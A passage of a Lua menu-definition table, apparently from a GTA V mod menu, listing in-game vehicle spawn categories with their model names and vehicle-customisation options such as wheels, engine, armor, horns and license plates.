'S80', 'Sc1', 'Scramjet', 'Sheava', 'SultanRS', 'T20', 'Taipan', 'Tempesta', 'Tezeract', 'Thrax', 'Turismor', 'Tyrant', 'Tyrus', 'Vacca', 'Vagner', 'Vigilante', 'Visione', 'Voltic', 'Voltic2', 'Zentorno', 'Xa21', 'Zorrusso', 'Armytanker', 'Armytrailer', 'Armytrailer2', 'Baletrailer', 'Boattrailer', 'Cablecar', 'Docktrailer', 'Freighttrailer', 'Graintrailer', 'Proptrailer', 'Raketailer', 'Tr2', 'Tr3', 'Tr4', 'Trflat', 'Tvtrailer', 'Tanker', 'Tanker2', 'Trailerlarge', 'Trailerlogs', 'Trailersmall', 'Trailers', 'Trailers2', 'Trailers3', 'Trailers4', 'Freight', 'Freightcar', 'Freightcont1', 'Freightcont2', 'Freightgrain', 'Metrotrain', 'Tankercar', 'Airtug', 'Caddy', 'Caddy2', 'Caddy3', 'Docktug', 'Forklift', 'Mower', 'Ripley', 'Sadler', 'Sadler2', 'Scrap', 'Towrruck', 'Towtruck2', 'Tractor', 'Tractor2', 'Tractor3', 'Utillitruck', 'Utillitruck3', 'Utillitruck2', 'Bison', 'Bison2', 'Bison3', 'Bobcatxl', 'Boxville', 'Boxville2', 'Boxville3', 'Boxville4', 'Boxville5', 'Burrito', 'Burrito2', 'Burrito3', 'Burrito4', 'Burrito5', 'Camper', 'Gburrito', 'Gburrito2', 'Journey', 'Minivan', 'Minivan2', 'Paradise', 'Pony', 'Pony2', 'Rumpo', 'Rumpo2', 'Rumpo3', 'Speedo', 'Speedo2', 'Speedo4', 'Surfer', 'Surfer2', 'Taco', 'Youga', 'Youga2'}},
            {text = '2-Step vehicle', dkey = 'vehicle_2stepvehicle', desc = 'Enable the 2-Step vehicle.\nLoud exhaust sounds.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Display speed', dkey = 'vehicle_displayspeed', desc = 'Display the vehicle speed.', option = __REAPER1__.M.Checkbox, func = false},
        },

        ['vehicle:savedvehicle'] = {
            {text = 'Save vehicle', dkey = 'vehicle:savedvehicle_saveveh', desc = 'Save the your last/current vehicle.', afu = __REAPER1__.M.vehicle.saved.save, option = __REAPER1__.M.Button},
        },

        ['vehicle:spawner'] = {
            {text = 'Custom', dkey = 'vehicle:spawner_custom', desc = 'Enter a vehicle name to spawn.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Button_Textbox, textboxtext = 'The vehicle name', length = 50, tipus = 'vegyes', func = 'None'},
            {text = 'Boat', dkey = 'vehicle:spawner_boat', desc = 'Spawn a boat vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Boat vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Dinghy', 'Dinghy2', 'Dinghy3', 'Dingh4', 'Jetmax', 'Marquis', 'Seashark', 'Seashark2', 'Seashark3', 'Speeder', 'Speeder2', 'Squalo', 'Submersible', 'Submersible2', 'Suntrap', 'Toro', 'Toro2', 'Tropic', 'Tropic2', 'Tug'}},
            {text = 'Commercial', dkey = 'vehicle:spawner_commercial', desc = 'Spawn a commercial vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Commercial vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Benson', 'Biff', 'Cerberus', 'Cerberus2', 'Cerberus3', 'Hauler', 'Hauler2', 'Mule', 'Mule2', 'Mule3', 'Mule4', 'Packer', 'Phantom', 'Phantom2', 'Phantom3', 'Pounder', 'Pounder2', 'Stockade', 'Stockade3', 'Terbyte'}},
            {text = 'Compact', dkey = 'vehicle:spawner_compact', desc = 'Spawn a compact vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Compact vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Asbo', 'Blista', 'Brioso', 'Dilettante', 'Dilettante2', 'Kanjo', 'Issi2', 'Issi3', 'Issi4', 'Iss5', 'Issi6', 'Panto', 'Prarire', 'Rhapsody'}},
            {text = 'Coupe', dkey = 'vehicle:spawner_coupe', desc = 'Spawn a coupe vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Coupe vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Cogcabrio', 'Exemplar', 'F620', 'Felon', 'Felon2', 'Jackal', 'Oracle', 'Oracle2', 'Sentinel', 'Sentinel2', 'Windsor', 'Windsor2', 'Zion', 'Zion2'}},
            {text = 'Cycle', dkey = 'vehicle:spawner_cycle', desc = 'Spawn a cycle vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Cycle vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Bmx', 'Cruiser', 'Fixter', 'Scorcher', 'Tribike', 'Tribike2', 'Tribike3'}},
            {text = 'Emergency', dkey = 'vehicle:spawner_emergency', desc = 'Spawn a emergency vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Emergency vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Ambulance', 'Fbi', 'Fbi2', 'Firetruk', 'Lguard', 'Pbus', 'Police', 'Police2', 'Police3', 'Police4', 'Policeold1', 'Policeold2', 'Policet', 'Policeb', 'Polmav', 'Pranger', 'Predator', 'Riot', 'Riot2', 'Sheriff', 'Sheriff2'}},
            {text = 'Helictoper', dkey = 'vehicle:spawner_helicopter', desc = 'Spawn a helicopter vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Helicopter vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Akula', 'Annihilator', 'Buzzard', 'Buzzard2', 'Cargobob', 'Cargobob2', 'Cargobob3', 'Cargobob4', 'Frogger', 'Frogger2', 'Havok', 'Hunter', 'Maverick', 'Savage', 'Seasparrow', 'Skylift', 'Supervolito', 'Supervolito2', 'Swift', 'Swift2', 'Valkyrie', 'Valkyrie2', 'Volatus'}},
            {text = 'Industrial', dkey = 'vehicle:spawner_industrial', desc = 'Spawn a industrial vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Industrial vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Bulldozer', 'Cutter', 'Dump', 'Flatbed', 'Guardian', 'Handler', 'Mixer', 'Mixer2', 'Rubble', 'Tiptruck', 'Tiptruck2'}},
            {text = 'Military', dkey = 'vehicle:spawner_military', desc = 'Spawn a military vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Military vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Apc', 'Barracks', 'Barracks2', 'Barracks3', 'Barrage', 'Chernobog', 'Crusader', 'Halftrack', 'Khanjali', 'Minitank', 'Rhino', 'Scarab', 'Scarab2', 'Scarab3', 'Thruster', 'Trailersmall2'}},
            {text = 'Motorcycle', dkey = 'vehicle:spawner_motorcycle', desc = 'Spawn a motorcycle vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Motorcycle vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Akuma', 'Avarus', 'Bagger', 'Bati', 'Bati2', 'BF400', 'Carbonrs', 'Chimera', 'Cliffhanger', 'Daemon', 'Daemon2', 'Defiler', 'Deathbike', 'Deathbike2', 'Deathbike3', 'Diablous', 'Diablous2', 'Double', 'Enduro', 'Esskey', 'Faggio', 'Faggio2', 'Faggio3', 'Fcr', 'Fcr2', 'Gargoyle', 'Hakuchou', 'Hakuchou2', 'Hexer', 'Innovation', 'Lectro', 'Manchez', 'Nemesis', 'Nightblade', 'Oppressor', 'Oppressor2', 'Pcj', 'Rrocket', 'Ratbike', 'Ruffian', 'Sanchez', 'Sanchez2', 'Sanctus', 'Shotaro', 'Sovereign', 'Stryder', 'Thrust', 'Vader', 'Vindicator', 'Vortex', 'Wolfsbane', 'Zombiea', 'Zombieb'}},
            {text = 'Muscle', dkey = 'vehicle:spawner_muscle', desc = 'Spawn a muscle vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Muscle vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Blade', 'Buccaneer', 'Buccaneer2', 'Chino', 'Chino2', 'Clique', 'Coquette3', 'Deviant', 'Dominator', 'Dominator2', 'Dominator3', 'Dominator4', 'Dominator5', 'Dominator6', 'Dukes', 'Dukes2', 'Ellie', 'Faction', 'Faction2', 'Faction3', 'Gauntlet', 'Gauntlet2', 'Gauntlet3', 'Gauntlet4', 'Hermes', 'Hotknife', 'Hustler', 'Impaler', 'Impaler2', 'Impaler3', 'Impaler4', 'Imperator', 'Imperator2', 'Imperator3', 'Lurcher', 'Moonbeam', 'Moonbeam2', 'Nightshade', 'Peyote2', 'Phoenix', 'Picador', 'Ratloader', 'RatLoader2', 'Ruiner', 'Ruiner2', 'Ruiner3', 'Sabregt', 'Sabregt2', 'Slamvan', 'Slamvan2', 'Slamvan3', 'Slamvan4', 'Slamvan5', 'Slamvan6', 'Stalion', 'Stalion2', 'Tampa', 'Tampa3', 'Tulip', 'Vamos,', 'Vigero', 'Virgo', 'Virgo2', 'Virgo3', 'Voodoo', 'Voodoo2', 'Yosemite', 'Yosemite2'}},
            {text = 'Off-road', dkey = 'vehicle:spawner_off-road', desc = 'Spawn a off-road vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Off-road vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Bfinjection', 'Bifta', 'Blazer', 'Blazer2', 'Blazer3', 'Blazer4', 'Blazer5', 'Bohdi', 'Brawler', 'Bruiser', 'Bruiser2', 'Bruiser3', 'Brutus', 'Brutus2', 'Brutus3', 'Caracara', 'Caracara2', 'Dloader', 'Dubsta3', 'Dune', 'Dune2', 'Dune3', 'Dune4', 'Dune5', 'Everon', 'Freecrawler', 'Hellion', 'Insurgent', 'Insurgent2', 'Insurgent3', 'Kalahari', 'Kamacho', 'Marshall', 'Menacer', 'Outlaw', 'Mesa3', 'Monster', 'Monster3', 'Monster4', 'Monster5', 'Nightshark', 'Rancherxl', 'Rancherxl2', 'Rebel', 'Rebel2', 'Rcbandito', 'Riata', 'Sandking', 'Sandking2', 'Technical', 'Technical2', 'Technical3', 'Trophytruck', 'Trophytruck2', 'Vagrant', 'Zhaba'}},
            {text = 'Plane', dkey = 'vehicle:spawner_plane', desc = 'Spawn a plane vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Plane vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Alphaz1', 'Avenger', 'Avenger2', 'Besra', 'Blimp', 'Blimp2', 'Blimp3', 'Bombushka', 'Cargoplane', 'Cuban800', 'Dodo', 'Duster', 'Howard', 'Hydra', 'Jet', 'Lazer', 'Luxor', 'Luxor2', 'Mammatus', 'Microlight', 'Miljet', 'Mogul', 'Molotok', 'Nimbus', 'Nokota', 'Pyro', 'Rogue', 'Seabreeze', 'Shamal', 'Starling', 'Striekforce', 'Stunt', 'Titan', 'Tula', 'Velum', 'Velum2', 'Vestra', 'Volatol'}},
            {text = 'Suv', dkey = 'vehicle:spawner_suv', desc = 'Spawn a suv vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Suv vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Bjxl', 'Baller', 'Baller2', 'Baller3', 'Baller4', 'Baller5', 'Baller6', 'Cavalcade', 'Cavalcade2', 'Contender', 'Dubsta', 'Dubsta2', 'Fq2', 'Granger', 'Gresley', 'Habanero', 'Huntley', 'Landstalker', 'Mesa', 'Mesa2', 'Novak', 'Patriot', 'Patriot2', 'Radi', 'Rebla', 'Rocoto', 'Seminole', 'Serrano', 'Toros', 'Xls', 'Xls2'}},
            {text = 'Sedan', dkey = 'vehicle:spawner_sedan', desc = 'Spawn a sedan vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sedan vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Asea', 'Asea2', 'Asterope', 'Cog55', 'Cogg552', 'Cognoscenti', 'Cognoscenti2', 'Emperor', 'Emperor2', 'Emperor3', 'Fugitive', 'Glendale', 'Ingot', 'Intruder', 'Limo2', 'Premier', 'Primo', 'Primo2', 'Regina', 'Romero', 'Stafford', 'Stanier', 'Stratum', 'Stretch', 'Superd', 'Surge', 'Tailgater', 'Warrener', 'Washington'}},
            {text = 'Service', dkey = 'vehicle:spawner_service', desc = 'Spawn a service vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Service vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Airbus', 'Brickade', 'Bus', 'Coach', 'Pbus2', 'Rallytruck', 'Rentalbus', 'Taxi', 'Tourbus', 'Trash', 'Trash2', 'Wastelander'}},
            {text = 'Sport', dkey = 'vehicle:spawner_', desc = 'Spawn a sport vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sport vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Alpha', 'Banshee', 'Bestiagts', 'Blista2', 'Blista3', 'Buffalo', 'Buffalo2', 'Buffalo3', 'Carbonizzare', 'Comet2', 'Comet3', 'Comet4', 'Comet5', 'Coquette', 'Drafter', 'Deveste', 'Elegy', 'Elegy2', 'Feltzer2', 'FlashGT', 'Furoregt', 'Fusilade', 'Futo', 'Gb200', 'Hotring', 'Komoda', 'Imorgon', 'Issi7', 'Italigto', 'Jester', 'Jester2', 'Jester3', 'Jugular', 'Khamelion', 'Kuruma', 'Kuruma2', 'Locust', 'Lynx', 'Massacro', 'Massacro2', 'Neo', 'Neon', 'Ninef', 'Ninef2', 'Omnis', 'Paragon', 'Paragon2', 'Pariah', 'Penumbra', 'Raiden', 'Rapidgt', 'Rapidgt2', 'Raptor', 'Revolter', 'Ruston', 'Schafter2', 'Schafter3', 'Schafter4', 'Schafter5', 'Schafter6', 'Schlagen', 'Schwarzer', 'Sentinel3', 'Seven70', 'Specter', 'Specter2', 'Streiter', 'Sugoi', 'Sultan', 'Sultan2', 'Surano', 'Tampa2', 'Tropos', 'Verlierer2', 'Vstr', 'Zr380', 'Zr3802', 'Zr3803'}},
            {text = 'Sport classic', dkey = 'vehicle:spawner_sportclassic', desc = 'Spawn a sport classic vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sport classic vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Ardent', 'Btype', 'Btype2', 'Btype3', 'Casco', 'Cheetah2', 'Cheburek', 'Coquette2', 'Deluxo', 'Dynasty', 'Fagaloa', 'Feltzer3', 'Gt500', 'Infernus2', 'Jb700', 'Jb7002', 'Mamba', 'Manana', 'Michelli', 'Monroe', 'Nebula', 'Peyote', 'Pigalle', 'Rapidgt3', 'Retinue', 'Retinue2', 'Savestra', 'Stinger', 'Stingergt', 'Stromberg', 'Swinger', 'Torero', 'Tornado', 'Tornado2', 'Tornado3', 'Tornado4', 'Tornado5', 'Tornado6', 'Turismo2', 'Viseris', 'Z190', 'Ztype', 'Zion3'}},
            {text = 'Super', dkey = 'vehicle:spawner_super', desc = 'Spawn a super vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Super vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Adder', 'Autarch', 'Banshee2', 'Bullet', 'Cheetah', 'Cyclone', 'Entity2', 'Entityxf', 'Emerus', 'Fmj', 'Gp1', 'Infernus', 'Italigtb', 'Italigtb2', 'Krieger', 'Le7b', 'Nero', 'Nero2', 'Osiris', 'Penetrator', 'Pfister811', 'Prototipo', 'Reaper', 'S80', 'Sc1', 'Scramjet', 'Sheava', 'SultanRS', 'T20', 'Taipan', 'Tempesta', 'Tezeract', 'Thrax', 'Turismor', 'Tyrant', 'Tyrus', 'Vacca', 'Vagner', 'Vigilante', 'Visione', 'Voltic', 'Voltic2', 'Zentorno', 'Xa21', 'Zorrusso'}},
            {text = 'Trailer', dkey = 'vehicle:spawner_trailer', desc = 'Spawn a trailer vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Trailer vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Armytanker', 'Armytrailer', 'Armytrailer2', 'Baletrailer', 'Boattrailer', 'Cablecar', 'Docktrailer', 'Freighttrailer', 'Graintrailer', 'Proptrailer', 'Raketailer', 'Tr2', 'Tr3', 'Tr4', 'Trflat', 'Tvtrailer', 'Tanker', 'Tanker2', 'Trailerlarge', 'Trailerlogs', 'Trailersmall', 'Trailers', 'Trailers2', 'Trailers3', 'Trailers4'}},
            {text = 'Train', dkey = 'vehicle:spawner_train', desc = 'Spawn a train vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Train vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Freight', 'Freightcar', 'Freightcont1', 'Freightcont2', 'Freightgrain', 'Metrotrain', 'Tankercar'}},
            {text = 'Utility', dkey = 'vehicle:spawner_utility', desc = 'Spawn a utility vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Utility vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Airtug', 'Caddy', 'Caddy2', 'Caddy3', 'Docktug', 'Forklift', 'Mower', 'Ripley', 'Sadler', 'Sadler2', 'Scrap', 'Towrruck', 'Towtruck2', 'Tractor', 'Tractor2', 'Tractor3', 'Utillitruck', 'Utillitruck3', 'Utillitruck2'}},
            {text = 'Van', dkey = 'vehicle:spawner_van', desc = 'Spawn a van vehicle.', afu = __REAPER1__.M.vehicle.spawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Van vehicle name', length = 50, tipus = 'betu', menuextra = 'image_vehicle', func = {'Bison', 'Bison2', 'Bison3', 'Bobcatxl', 'Boxville', 'Boxville2', 'Boxville3', 'Boxville4', 'Boxville5', 'Burrito', 'Burrito2', 'Burrito3', 'Burrito4', 'Burrito5', 'Camper', 'Gburrito', 'Gburrito2', 'Journey', 'Minivan', 'Minivan2', 'Paradise', 'Pony', 'Pony2', 'Rumpo', 'Rumpo2', 'Rumpo3', 'Speedo', 'Speedo2', 'Speedo4', 'Surfer', 'Surfer2', 'Taco', 'Youga', 'Youga2'}},
            {text = 'Preferences', option = __REAPER1__.M.Separator},
            {text = 'Inside', dkey = 'vehicle:spawner_inside', desc = 'Spawn inside the vehicle.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'License plate', dkey = 'vehicle:spawner_licenseplate', desc = 'Spawn with a custom license plate.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'License plate', length = 8, tipus = 'vegyes', func = 'None'},
        },
    
        ['vehicle:customs'] = {
            {text = 'Tune fully', dkey = 'vehicle:customs_tunefully', desc = 'Fully tune the vehicle. Doesn\'t change\nappearance.', afu = __REAPER1__.M.vehicle.customs.tunefully, option = __REAPER1__.M.Button},
            {text = 'Auto tune fully', dkey = 'vehicle:customs_autotunefully', desc = 'Auto fully tuning.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Downgrade', dkey = 'vehicle:customs_downgrade', desc = 'Remove the customs and tuning from\nthe vehicle.', afu = __REAPER1__.M.vehicle.customs.downgrade, option = __REAPER1__.M.Button},
            {text = 'Randomize look', dkey = 'vehicle:customs_randomizelook', desc = 'Randomize the look of the vehicle.', afu = __REAPER1__.M.vehicle.customs.randomizelook, option = __REAPER1__.M.Button},
            {text = 'Loop randomize look', dkey = 'vehicle:customs_looprandomizelook', desc = 'Loop vehicle look randomizing.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Los Santos Customs', option = __REAPER1__.M.Separator},
            {text = 'Respray', dkey = 'vehicle:customs:respray', desc = 'Vehicle respray menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle:customs', 'vehicle:customs:respray'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Neon lights', dkey = 'vehicle:customs:neonlights', desc = 'Vehicle neon lights menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle:customs', 'vehicle:customs:neonlights'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Xenon lights', dkey = 'vehicle:customs:xenonlights', desc = 'Vehicle xenon lights menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle:customs', 'vehicle:customs:xenonlights'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Wheels', dkey = 'vehicle:customs:wheels', desc = 'Vehicle wheels menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle:customs', 'vehicle:customs:wheels'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Modkit', dkey = 'vehicle:customs_modkit', desc = 'Set the vehicle\'s modkit. Not\nrecommended to mess with.', afu = __REAPER1__.M.vehicle.customs.modkit, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle modkit number', length = 1, tipus = 'szam', func = {-1, 0, 1, 2, 3}},
            {text = 'Plate text', dkey = 'vehicle:customs_platetext', desc = 'Set the vehicle\'s license plate text.', afu = __REAPER1__.M.vehicle.customs.platetext, option = __REAPER1__.M.Button_Textbox, textboxtext = 'License plate', length = 8, tipus = 'vegyes', func = 'None'},
            {text = 'Plate type', dkey = 'vehicle:customs_platetype', desc = 'Set the license plate type (color).', afu = __REAPER1__.M.vehicle.customs.platetype, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'License plate type', length = 20, tipus = 'betu', func = {'Yellow Black', 'Yellow Blue', 'Blue White 2', 'Blue White 3', 'North Yankton'}},
            {text = 'Wheel height', dkey = 'vehicle:customs_wheelheight', desc = 'Set the vehicle\'s wheel height.', afu = __REAPER1__.M.vehicle.customs.wheelheight, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle wheel height number', length = 4, tipus = 'vegyes', func = {-100, -99, -98, -97, -96, -95, -94, -93, -92, -91, -90, -89, -88, -87, -86, -85, -84, -83, -82, -81, -80, -79, -78, -77, -76, -75, -74, -73, -72, -71, -70, -69, -68, -67, -66, -65, -64, -63, -62, -61, -60, -59, -58, -57, -56, -55, -54, -53, -52, -51, -50, -49, -48, -47, -46, -45, -44, -43, -42, -41, -40, -39, -38, -37, -36, -35, -34, -33, -32, -31, -30, -29, -28, -27, -26, -25, -24, -23, -22, -21, -20, -19, -18, -17, -16, -15, -14, -13, -12, -11, -10, -9, -8, -7, -6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100}},
            {text = 'Wheel distance', dkey = 'vehicle:customs_wheelwidth', desc = 'Wheel distnace from the vehicle.', afu = __REAPER1__.M.vehicle.customs.wheeldist, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle wheel distance number', length = 3, tipus = 'szam', toggle = false, func = __REAPER1__.T.Szazas},
            {text = 'Engine', dkey = 'vehicle:customs_engine', desc = 'Change the vehicle\'s engine.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle engine number', length = 1, tipus = 'szam', extra = 11, func = {-1, 0, 1, 2, 3}},
            {text = 'Brakes', dkey = 'vehicle:customs_brakes', desc = 'Change the vehicle\'s brakes.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle brakes number', length = 1, tipus = 'szam', extra = 12, func = {-1, 0, 1, 2}},
            {text = 'Transmission', dkey = 'vehicle:customs_transmission', desc = 'Change the vehicle\'s transmission.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle transmission number', length = 1, tipus = 'szam', extra = 13, func = {-1, 0, 1, 2}},
            {text = 'Suspension', dkey = 'vehicle:customs_suspension', desc = 'Change the vehicle\'s suspension.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle  number', length = 1, tipus = 'szam', extra = 15, func = {-1, 0, 1, 2, 3}},
            {text = 'Armor', dkey = 'vehicle:customs_armor', desc = 'Change the vehicle\'s armor.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle armor number', length = 1, tipus = 'szam', extra = 16, func = {-1, 0, 1, 2, 3, 4}},
            {text = 'Turbo', dkey = 'vehicle:customs_turbo', desc = 'Toggle the turbo in the vehicle.', afu = __REAPER1__.M.vehicle.customs.togglevehiclemod, option = __REAPER1__.M.Checkbox, func = false, extra = 18},
            {text = 'Window tint', dkey = 'vehicle:customs_windowtint', desc = 'Change the vehicle\'s window tint.', afu = __REAPER1__.M.vehicle.customs.windowtint, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle window tint', length = 20, tipus = 'betu', func = {'None', 'Pure black', 'Dark smoke', 'Light smoke', 'Stock', 'Limo', 'Green'}},
            {text = 'Horns', dkey = 'vehicle:customs_horns', desc = 'Change the vehicle\'s horns.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle horn', length = 20, tipus = 'betu', extra = 14, func = {'Stock', 'Truck', 'Police', 'Clown', 'Musical1', 'Musical2', 'Musical3', 'Musical4', 'Musical5', 'Sadtrombone', 'Calssical1', 'Calssical2', 'Calssical3', 'Calssical4', 'Calssical5', 'Calssical6', 'Calssical7', 'Scaledo', 'Scalere', 'Scalemi', 'Scalefa', 'Scalesol', 'Scalela', 'Scaleti', 'Scaledo_high', 'Jazz1', 'Jazz2', 'Jazz3', 'Jazzloop', 'Starspangban1', 'Starspangban2', 'Starspangban3', 'Starspangban4', 'Classicalloop1', 'Classical8', 'Classicalloop2'}},
            {text = 'Extra', dkey = 'vehicle:customs_extra', desc = 'Change the vehicle\'s extra.', afu = __REAPER1__.M.vehicle.customs.extra, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle extra number', length = 1, tipus = 'szam', func = {-1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9}},
            {text = 'Spoiler', dkey = 'vehicle:customs_spoiler', desc = 'Change the vehicle\'s spoiler.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle spoiler number', length = 1, tipus = 'szam', extra = 0, func = {'None'}},
            {text = 'Front bumper', dkey = 'vehicle:customs_frontbumper', desc = 'Change the vehicle\'s front bumper.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle front bumper number', length = 1, tipus = 'szam', extra = 1, func = {'None'}},
            {text = 'Rear bumper', dkey = 'vehicle:customs_rearbumper', desc = 'Change the vehicle\'s rear bumper.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle rear bumper number', length = 1, tipus = 'szam', extra = 2, func = {'None'}},
            {text = 'Side skirt', dkey = 'vehicle:customs_sideskirt', desc = 'Change the vehicle\'s side skirt.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle side skirt number', length = 1, tipus = 'szam', extra = 3, func = {'None'}},
